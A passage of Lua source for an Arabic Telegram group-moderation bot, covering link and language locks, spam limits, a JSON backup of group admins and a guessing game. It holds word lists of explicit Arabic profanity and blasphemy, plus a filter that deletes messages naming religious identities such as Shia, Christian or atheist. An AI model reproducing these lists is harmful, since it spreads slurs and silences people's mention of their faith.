if DevHmD:get(DevTwix..'HmD:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevHmD:get(DevTwix..'HmD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevHmD:get(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevHmD:get(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevHmD:get(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevHmD:get(DevTwix..'HmD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
---------------------------------------------------------------------------------------
--          Gif           --
elseif msg.content_.ID == "MessageAnimation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevHmD:get(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevHmD:get(DevTwix..'HmD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevHmD:get(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevHmD:get(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevHmD:get(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevHmD:get(DevTwix..'HmD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
---------------------------------------------------------------------------------------
--         Text           --
elseif msg.content_.ID == "MessageText" then
if not VipMem(msg) then
Filters(msg,text)
if msg.forward_info_ then
if DevHmD:get(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if DevHmD:get(DevTwix..'HmD:Lock:Links'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.text_:match("@") then
if DevHmD:get(DevTwix..'HmD:Lock:Tags'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("#") then
if DevHmD:get(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevHmD:get(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if DevHmD:get(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
if not DevHmD:get(DevTwix..'HmD:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevHmD:get(DevTwix..'HmD:Spam:Text'..msg.chat_id_))
end
if DevHmD:get(DevTwix..'HmD:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevHmD:get(DevTwix..'HmD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
---------------------------------------------------------------------------------------
if DevHmD:get(DevTwix.."HmD:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"⋄︙تم الغاء حفظ الرابط")       
DevHmD:del(DevTwix.."HmD:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevHmD:set(DevTwix.."HmD:Groups:Links"..msg.chat_id_,Link)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حفظ الرابط بنجاح', 1, 'md')
DevHmD:del(DevTwix.."HmD:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false 
end
end
---------------------------------------------------------------------------------------
local msg = data.message_
text = msg.content_.text_
if text and Constructor(msg) then 
if DevHmD:get('DevTwixTeam:'..DevTwix.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevHmD:del('DevTwixTeam:'..DevTwix..'id:user'..msg.chat_id_)  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء الامر', 1, 'md')
DevHmD:del('DevTwixTeam:'..DevTwix.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevHmD:del('DevTwixTeam:'..DevTwix.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevHmD:get('DevTwixTeam:'..DevTwix..'id:user'..msg.chat_id_)  
DevHmD:incrby(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_HmD(msg.chat_id_, msg.id_,  1, "⋄︙تم اضافة "..numadded..' رساله', 1, 'md')
DevHmD:del('DevTwixTeam:'..DevTwix..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevHmD:get('DevTwixTeam:'..DevTwix.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevHmD:del('DevTwixTeam:'..DevTwix..'ids:user'..msg.chat_id_)  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء الامر', 1, 'md')
DevHmD:del('DevTwixTeam:'..DevTwix.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevHmD:del('DevTwixTeam:'..DevTwix.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevHmD:get('DevTwixTeam:'..DevTwix..'ids:user'..msg.chat_id_)  
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..iduserr,numadded)  
Dev_HmD(msg.chat_id_, msg.id_,  1, "⋄︙تم اضافة "..numadded..' نقطه', 1, 'md')
DevHmD:del('DevTwixTeam:'..DevTwix..'ids:user'..msg.chat_id_)  
end
end
---------------------------------------------------------------------------------------
if text and (text:match("طيز") or text:match("ديس") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("كس امك") or text:match("صرم") or text:match("كس اختك")) then
if not DevHmD:get(DevTwix.."HmD:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⋄︙ممنوع الفشار في المجموعه")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevHmD:get(DevTwix.."HmD:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⋄︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevHmD:get(DevTwix.."HmD:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevHmD:get(DevTwix.."HmD:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⋄︙ممنوع الكفر في المجموعه") 
end end
if text and (text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("انا سني") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("شيعة")) then
if not DevHmD:get(DevTwix.."HmD:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⋄︙ممنوع التكلم بالطائفيه هنا") 
end end
---------------------------------------------------------------------------------------
if SecondSudo(msg) then
if text == 'جلب نسخه الكروبات' and ChCheck(msg) or text == 'جلب نسخه احتياطيه' and ChCheck(msg) or text == 'جلب النسخه الاحتياطيه' and ChCheck(msg) or text == '× جلب نسخه الكروبات ×' and ChCheck(msg) then
local List = DevHmD:smembers(DevTwix..'HmD:Groups') 
local BotName = (DevHmD:get(DevTwix.."HmD:NameBot") or 'تويكس')
local GetJson = '{"BotId": '..DevTwix..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevHmD:get(DevTwix.."HmD:Groups:Links"..v)
Welcomes = DevHmD:get(DevTwix..'HmD:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
HmDConstructors = DevHmD:smembers(DevTwix..'HmD:HmDConstructor:'..v)
Constructors = DevHmD:smembers(DevTwix..'HmD:HMDicConstructor:'..v)
HMDicConstructors = DevHmD:smembers(DevTwix..'HmD:Constructor:'..v)
Managers = DevHmD:smembers(DevTwix..'HmD:Managers:'..v)
Admis = DevHmD:smembers(DevTwix..'HmD:Admins:'..v)
Vips = DevHmD:smembers(DevTwix..'HmD:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #HMDicConstructors ~= 0 then
GetJson = GetJson..'"HMDicConstructors":['
for k,v in pairs(HMDicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #HmDConstructors ~= 0 then
GetJson = GetJson..'"HmDConstructors":['
for k,v in pairs(HmDConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..DevTwix..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..DevTwix..'.json', '⋄︙يحتوي الملف على » '..#List..' مجموعه',dl_cb, nil)
io.popen('rm -rf ./'..DevTwix..'.json')
end
if text and (text == 'رفع النسخه' or text == 'رفع النسخه الاحتياطيه' or text == 'رفع نسخه الاحتياطيه') and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
---------------------------------------------------------------------------------------
if DevHmD:get(DevTwix.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_HmD( msg.chat_id_, msg.id_, 1,"⋄︙يوجد فقط ( 6 ) اختيارات\n⋄︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevHmD:get(DevTwix.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevHmD:del(DevTwix.."SET:GAME"..msg.chat_id_)   
Dev_HmD( msg.chat_id_, msg.id_, 1,'⋄︙*المحيبس باليد رقم* » '..NUM..'\n⋄︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevHmD:del(DevTwix.."SET:GAME"..msg.chat_id_)   
Dev_HmD( msg.chat_id_, msg.id_, 1,'⋄︙*المحيبس باليد رقم* » '..GETNUM..'\n⋄︙*للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
end
end
end
if DevHmD:get(DevTwix..'DevHmD4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "⋄︙تم الغاء الامر")
DevHmD:del(DevTwix..'DevHmD4'..msg.sender_user_id_)
return false  end 
DevHmD:del(DevTwix..'DevHmD4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '⋄︙المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '⋄︙عذرا لا يمكنك وضع معرف حسابات في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, '⋄︙عذرا لا يمكنك وضع معرف مجموعه في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'⋄︙البوت ادمن في القناة \n⋄︙تم تفعيل الاشتراك الاجباري \n⋄︙ايدي القناة » '..data.id_..'\n⋄︙معرف القناة » [@'..data.type_.channel_.username_..']')
DevHmD:set(DevTwix..'HmD:ChId',data.id_)
else
send(msg.chat_id_, msg.id_,'⋄︙عذرا البوت ليس ادمن في القناة')
end
return false  
end
end,nil)
end
---------------------------------------------------------------------------------------
if DevHmD:get(DevTwix.."HmD:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevHmD:del(DevTwix.."HmD:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء الامر', 1, 'md')
return false 
end 
DevHmD:del(DevTwix.."HmD:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevHmD:set(DevTwix.."DevText", DevText)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حفظ كليشة المطور", 1, "md")
end
if DevHmD:get(DevTwix..'HmD:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevHmD:del(DevTwix..'HmD:NameBot'..msg.sender_user_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حفظ اسم البوت ', 1, 'html')
DevHmD:del(DevTwix..'HmD:NameBot'..msg.sender_user_id_)
DevHmD:set(DevTwix..'HmD:NameBot', text)
return false 
end
---------------------------------------------------------------------------------------
if text == "الرابط" then
if not DevHmD:get(DevTwix.."HmD:Lock:GpLinks"..msg.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or DevHmD:get(DevTwix.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local Text = '⋄︙Link Gruop :\n⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ \n['..ta.title_..']('..linkgpp.result..')'
keyboard = {}  
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Help or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end,nil) 
end
end
---------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevHmD:incr(DevTwix..'HmD:UsersMsgs'..DevTwix..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevHmD:incr(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevHmD:incr(DevTwix..'HmD:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevHmD:sismember(DevTwix.."HmD:Users",msg.chat_id_) then
DevHmD:sadd(DevTwix.."HmD:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
---------------------------------------------------------------------------------------
if ChatType == 'sp' or ChatType == 'gp' or ChatType == 'pv' then
if text == 'بوت' or text == 'بوتت' then 
NameBot = (DevHmD:get(DevTwix..'HmD:NameBot') or 'تويكس')
local DevTwixTeam = {' اسمي الحات '..NameBot..' ',' اسمي الطيف '..NameBot..' ',' اسمي القميل '..NameBot..' ','  اسمي المبدع '..NameBot..' '}
DevHmD2 = math.random(#DevTwixTeam) 
Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam[DevHmD2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevHmD:get(DevTwix..'HmD:NameBot') or 'تويكس') 
local DevTwixTeam = {"اسمي القميل "..NameBot.." "} 
DevHmD2 = math.random(#DevTwixTeam) 
Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam[DevHmD2] , 1, 'html') 
return false
end
if text and text == (DevHmD:get(DevTwix..'HmD:NameBot') or 'تويكس') then 
NameBot = (DevHmD:get(DevTwix..'HmD:NameBot') or 'تويكس')
local namebot = {'راح نموت بكورونا ونته بعدك تصيح',' هاقلبي؟ كول',' لاتوصخ اسمي',' تفضل شتريد ؟',' عمري الحلو','• تّٰفِٰـضـﮧلْٰ حٌٰبٌِٰـہيَٰ 🌚💫 ',' صاعد اتصال ويا الحب دقيقة وجيك 😘💘'} 
name = math.random(#namebot) 
Dev_HmD(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'html') 
return false 
end
if text =='مجوهراتي' and ChCheck(msg) then 
if tonumber((DevHmD:get(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لم تربح اي نقطه\n⋄︙ارسل » الالعاب للعب', 1, 'md')
else 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙عدد النقاط التي ربحتها » '..(DevHmD:get(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevHmD:del(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف مجوهراتي' and ChCheck(msg) or text ==  'مسح مجوهراتي' and ChCheck(msg) then DevHmD:del(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حذف جميع نقاطك', 1, 'md') end
---------------------------------------------------------------------------------------
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) or text == '» سمايلات ✧' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
DevHmD2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','??','🥓','🥩','??','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevHmD2[math.random(#DevHmD2)]
DevHmD:set(DevTwix..'HmD:GameNum'..msg.chat_id_,name)
DevHmD:del(DevTwix..'HmD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
